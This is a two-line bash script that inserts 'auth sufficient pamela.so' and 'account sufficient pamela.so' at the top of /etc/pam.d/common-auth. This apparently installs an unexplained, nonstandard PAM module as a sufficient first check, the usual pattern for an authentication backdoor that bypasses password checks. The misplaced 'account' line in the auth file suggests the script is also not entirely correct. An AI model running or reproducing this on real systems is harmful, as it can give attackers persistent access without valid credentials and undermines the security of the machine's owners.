#!/bin/bash

sed -i '1iaccount sufficient pamela.so' /etc/pam.d/common-auth

sed -i '1iauth sufficient pamela.so' /etc/pam.d/common-auth
